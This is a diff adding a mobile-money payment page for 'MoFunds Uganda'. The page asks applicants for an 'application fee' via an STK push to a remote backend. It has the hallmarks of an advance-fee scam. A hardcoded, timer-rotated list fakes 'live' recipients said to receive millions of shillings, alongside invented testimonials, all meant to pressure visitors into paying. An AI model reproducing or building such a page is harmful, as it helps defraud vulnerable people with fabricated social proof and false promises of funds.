@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#FFD100">
+<title>MoFunds Uganda — Payment</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+font-family:Arial,sans-serif;
+min-height:100vh;
+padding:12px;
+background:
+radial-gradient(circle at 10% 10%,rgba(255,209,0,.35),transparent 28%),
+radial-gradient(circle at 90% 90%,rgba(245,176,0,.35),transparent 28%),
+linear-gradient(135deg,#FFD100,#F5B000);
+color:#000;
+}
+
+.container{width:100%;max-width:420px;margin:auto;}
+
+.card{
+padding:20px 16px;
+border-radius:20px;
+background:rgba(255,255,255,.95);
+border:1px solid rgba(0,0,0,.08);
+backdrop-filter:blur(14px);
+box-shadow:0 18px 40px rgba(0,0,0,.25);
+}
+
+h1{text-align:center;font-size:24px;margin-bottom:8px;}
+
+p{text-align:center;font-size:14px;line-height:1.5;color:#444;}
+
+.amount{
+margin:18px 0;
+padding:14px;
+border-radius:12px;
+text-align:center;
+font-size:20px;
+font-weight:bold;
+background:rgba(255,209,0,.18);
+border:1px solid rgba(0,0,0,.12);
+}
+
+.money{color:#000;}
+
+label{
+display:block;
+margin:14px 0 6px;
+font-weight:bold;
+font-size:14px;
+}
+
+input{
+width:100%;
+padding:13px;
+border-radius:10px;
+border:1px solid rgba(0,0,0,.15);
+background:#fff;
+color:#000;
+font-size:16px;
+outline:none;
+}
+
+input:focus{
+border-color:#000;
+box-shadow:0 0 0 3px rgba(255,209,0,.25);
+}
+
+button{
+width:100%;
+padding:14px;
+margin-top:18px;
+border:none;
+border-radius:11px;
+background:linear-gradient(135deg,#000,#222);
+color:#FFD100;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 10px 25px rgba(0,0,0,.25);
+transition:.25s;
+}
+
+button:hover{transform:translateY(-2px);}
+button:disabled{opacity:.6;cursor:not-allowed;box-shadow:none;transform:none;}
+
+#stkMessage{
+min-height:35px;
+margin-top:12px;
+text-align:center;
+font-size:13px;
+font-weight:600;
+}
+
+.success{color:#0A7A2A;}
+.error{color:#D32F2F;}
+
+.small{
+margin-top:10px;
+font-size:12px;
+color:#666;
+}
+
+.live-comments{
+position:relative;
+margin-top:25px;
+padding:18px;
+border-radius:18px;
+background:rgba(255,255,255,.9);
+border:1px solid rgba(0,0,0,.08);
+overflow:hidden;
+}
+
+.live-comments h3{
+text-align:center;
+font-size:17px;
+margin-bottom:15px;
+position:relative;
+z-index:2;
+}
+
+.live-comment{
+display:flex;
+align-items:center;
+gap:10px;
+padding:12px;
+margin-bottom:10px;
+border-radius:12px;
+background:rgba(255,209,0,.18);
+border:1px solid rgba(0,0,0,.12);
+position:relative;
+z-index:2;
+}
+
+.live-comment:last-child{margin-bottom:0;}
+
+.live-avatar{
+width:42px;
+height:42px;
+border-radius:50%;
+background:#000;
+color:#FFD100;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:20px;
+flex-shrink:0;
+}
+
+.live-content strong{display:block;font-size:14px;}
+.live-content p{text-align:left;font-size:13px;margin:2px 0;color:#444;}
+.live-content small{font-size:11px;color:#666;}
+
+.flower-rain{
+position:absolute;
+top:42px;
+left:0;
+width:100%;
+height:170px;
+pointer-events:none;
+z-index:1;
+}
+
+.rain-flower{
+position:absolute;
+top:-30px;
+font-size:20px;
+animation:flowerFall linear forwards;
+}
+
+.footer{
+text-align:center;
+padding:14px;
+font-size:12px;
+color:#666;
+}
+
+@keyframes flowerFall{
+0%{transform:translateY(-20px) rotate(0deg);opacity:1;}
+100%{transform:translateY(190px) rotate(360deg);opacity:0;}
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<div class="card">
+
+<h1>🌟 MOMO Funds Uganda</h1>
+
+<p>👋 Welcome, <strong id="name">Applicant</strong></p>
+
+<p>Please complete the application payment to continue.</p>
+
+<div class="amount" id="selectedAmountBox">
+💵 Selected Amount: <span class="money">UGX 0</span>
+</div>
+
+<div class="amount" id="feeAmount">
+🧾 Application Fee: <span class="money">UGX 450</span>
+</div>
+
+<label>👤 Full Name</label>
+<input type="text" id="fullName" readonly>
+
+<label>📱 Phone Number</label>
+<input type="tel" id="phone" placeholder="2567XXXXXXXX" maxlength="12">
+
+<button id="payBtn">💳 Continue Payment</button>
+
+<div id="stkMessage"></div>
+
+<p class="small">
+📲 Follow the payment instructions on the phone number entered above.
+</p>
+
+<div class="live-comments">
+
+<h3>🎉 PEOPLE RECEIVING MOMO FUNDS UGANDA SUPPORT RIGHT NOW</h3>
+
+<div class="flower-rain" id="flowerRain"></div>
+
+<div class="live-comment">
+<div class="live-avatar">💰</div>
+<div class="live-content">
+<strong id="liveName1">Amina</strong>
+<p><span id="livePhone1">07*****95</span> completed an application</p>
+<small id="liveTime1">5s ago</small>
+</div>
+</div>
+
+<div class="live-comment">
+<div class="live-avatar">💰</div>
+<div class="live-content">
+<strong id="liveName2">Brian</strong>
+<p><span id="livePhone2">07*****28</span> completed an application</p>
+<small id="liveTime2">12s ago</small>
+</div>
+</div>
+
+</div>
+
+<div class="footer">
+© 2026 MoFunds Uganda
+</div>
+
+</div>
+</div>
+
+<script>
+"use strict";
+
+const BACKEND_URL="https://https-momo-funds-uganda-onrender-com.onrender.com";
+
+const applicant=
+localStorage.getItem("fullName")||
+localStorage.getItem("fullname")||
+localStorage.getItem("applicantName")||
+"Applicant";
+
+const savedPhone=
+localStorage.getItem("phoneNumber")||
+localStorage.getItem("phone")||
+"";
+
+const processingFee=
+Number(localStorage.getItem("processingFee")||450);
+
+const selectedAmount=
+Number(localStorage.getItem("selectedAmount")||0);
+
+document.getElementById("name").textContent=applicant;
+document.getElementById("fullName").value=applicant;
+document.getElementById("phone").value=savedPhone;
+
+document.getElementById("selectedAmountBox").innerHTML=
+"💵 Selected Amount: <span class='money'>UGX "+selectedAmount.toLocaleString("en-UG")+"</span>";
+
+document.getElementById("feeAmount").innerHTML=
+"🧾 Application Fee: <span class='money'>UGX "+processingFee.toLocaleString("en-UG")+"</span>";
+
+const phoneEl=document.getElementById("phone");
+const payBtn=document.getElementById("payBtn");
+const msg=document.getElementById("stkMessage");
+
+function setMessage(text,type=""){
+msg.textContent=text;
+msg.className=type;
+}
+
+function setLoading(state,text){
+payBtn.disabled=state;
+payBtn.textContent=state?text:"💳 Continue Payment";
+}
+
+function normalizePhone(value){
+let phone=value.replace(/[^\d]/g,"");
+if(phone.startsWith("0")) phone="256"+phone.slice(1);
+return phone;
+}
+
+async function readJson(res){
+const txt=await res.text();
+
+if(!txt) return {};
+
+try{
+return JSON.parse(txt);
+}catch{
+throw new Error("Server returned an invalid response.");
+}
+}
+
+async function payNow(){
+
+const phone=normalizePhone(phoneEl.value.trim());
+
+if(!/^2567\d{8}$/.test(phone)){
+setMessage("Enter a valid Uganda phone number.","error");
+return;
+}
+
+localStorage.setItem("phoneNumber",phone);
+
+setLoading(true,"Processing...");
+setMessage("Sending payment request...");
+
+try{
+
+const response=await fetch(`${BACKEND_URL}/api/uganda/stk-push`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+phone,
+amount:processingFee
+})
+});
+
+const data=await readJson(response);
+
+if(!response.ok||!data.success){
+throw new Error(data.message||"Payment request failed.");
+}
+
+const transactionId=
+data.transactionId||
+data.data?.transaction_id||
+data.data?.transactionId||
+data.transaction_id||
+data.reference||
+data.data?.reference;
+
+if(!transactionId){
+throw new Error("AUTOPAY did not return a transaction ID.");
+}
+
+setLoading(true,"Waiting...");
+setMessage("Payment request sent. Waiting for confirmation...");
+
+await checkPayment(transactionId);
+
+}catch(error){
+setMessage(error.message,"error");
+setLoading(false,"💳 Continue Payment");
+}
+}
+
+async function checkPayment(transactionId){
+
+const start=Date.now();
+
+while(Date.now()-start<120000){
+
+try{
+
+const response=await fetch(`${BACKEND_URL}/api/uganda/status/${transactionId}`);
+
+const result=await readJson(response);
+
+const payment=result.data||result;
+const status=String(payment.status||"").toUpperCase();
+
+if(status==="PENDING"){
+setMessage("Payment request sent. Waiting for confirmation...");
+}
+
+if(["SUCCESS","SUCCESSFUL"].includes(status)){
+setMessage("Payment successful. Redirecting...","success");
+setLoading(true,"Confirmed");
+setTimeout(()=>window.location.href="delivery.html",1000);
+return;
+}
+
+if(["FAILED","CANCELLED"].includes(status)){
+throw new Error("Payment "+status.toLowerCase()+".");
+}
+
+}catch(error){
+
+if(/failed|cancelled/i.test(error.message)){
+setMessage(error.message,"error");
+setLoading(false,"💳 Continue Payment");
+return;
+}
+
+}
+
+await new Promise(r=>setTimeout(r,5000));
+
+}
+
+setMessage("Payment confirmation timed out.","error");
+setLoading(false,"💳 Continue Payment");
+}
+
+payBtn.addEventListener("click",payNow);
+
+const rainContainer=document.getElementById("flowerRain");
+const flowerIcons=["🌸","🌺","🌹","🌼","💐","🌷"];
+
+function createRainFlower(){
+const flower=document.createElement("span");
+flower.className="rain-flower";
+flower.textContent=flowerIcons[Math.floor(Math.random()*flowerIcons.length)];
+flower.style.left=Math.random()*100+"%";
+flower.style.fontSize=(16+Math.random()*12)+"px";
+flower.style.animationDuration=(2+Math.random()*2)+"s";
+rainContainer.appendChild(flower);
+setTimeout(()=>flower.remove(),4000);
+}
+
+setInterval(createRainFlower,180);
+
+const livePeople=[
+  ["Amina","07*****37","Application submitted","3s ago"],
+  ["Brian","07*****47","Received UGX 1,700,500","19s ago"],
+  ["Grace","07*****65","Application submitted","16s ago"],
+  ["Sarah","07*****39","Received UGX 4,524,500","8s ago"],
+  ["John","07*****95","Application submitted","5s ago"],
+  ["David","07*****28","Received UGX 2,100,500","12s ago"],
+  ["Achieng","07*****37","Received UGX 2,100,500","3s ago"],
+  ["Wairimu","07*****47","Received UGX 3,100,500","19s ago"],
+  ["Otieno","07*****65","Received UGX 6,658,500","16s ago"],
+  ["Cheruiyot","07*****39","Received UGX 1,228,500","8s ago"],
+  ["Wanjiku","07*****95","Received UGX 1,228,500","5s ago"],
+  ["Kiptoo","07*****28","Received UGX 1,700,500","12s ago"],
+  ["Victor Yegon","Funds helped me pay my rent. Thank you!","3s ago"],
+  ["Irene Atieno","Quick approval and smooth process.","8s ago"],
+  ["Winfred Chepkemoi","Everything was easy to understand.","12s ago"],
+  ["Victor Ochieng","The application process was simple.","15s ago"],
+  ["Mary Wanjiku","Customer support was very helpful.","18s ago"],
+  ["Brian Kiptoo","I liked how easy it was to apply.","21s ago"],
+  ["Faith Njeri","The experience was smooth from start to finish.","25s ago"],
+  ["James Mutua","The website was easy to use.","30s ago"],
+  ["Grace Atieno","The instructions were clear and helpful.","34s ago"],
+  ["Peter Mwangi","Everything worked well on my phone.","39s ago"],
+  ["Chebet Mercy","A very straightforward experience.","43s ago"],
+  ["John Omondi","The process was fast and simple.","48s ago"],
+  ["Daniel Wekesa","I completed the application without problems.","54s ago"],
+  ["Faith Akinyi","The design is clean and easy to follow.","59s ago"],
+  ["Kiplagat Eric","A smooth experience from beginning to end.","1m ago"],
+  ["Njeri","07*****71","Received UGX 1,228,500","9s ago"],
+  ["Mutua","07*****84","Received UGX 2,100,500","15s ago"],
+  ["Atieno","07*****53","Received UGX 3,100,500","7s ago"],
+  ["Mwangi","07*****16","Received UGX 6,658,500","11s ago"],
+  ["Chebet","07*****62","Received UGX 1,700,500","6s ago"],
+  ["Omondi","07*****48","Received UGX 2,100,500","14s ago"],
+  ["Wekesa","07*****11","Received UGX 5,624,500","20s ago"],
+  ["Faith","07*****74","Received UGX 3,100,500","10s ago"],
+  ["Mary","07*****71","Application submitted","9s ago"],
+  ["Peter","07*****84","Received UGX 1,228,500","15s ago"]
+]
+
+let current=0;
+
+function updateLiveComments(){
+const p1=livePeople[current];
+const p2=livePeople[(current+1)%livePeople.length];
+
+liveName1.textContent=p1[0];
+livePhone1.textContent=p1[1];
+liveTime1.textContent=p1[3];
+
+liveName2.textContent=p2[0];
+livePhone2.textContent=p2[1];
+liveTime2.textContent=p2[3];
+
+current=(current+2)%livePeople.length;
+}
+
+updateLiveComments();
+setInterval(updateLiveComments,3000);
+
+</script>
+
+</body>
+</html>
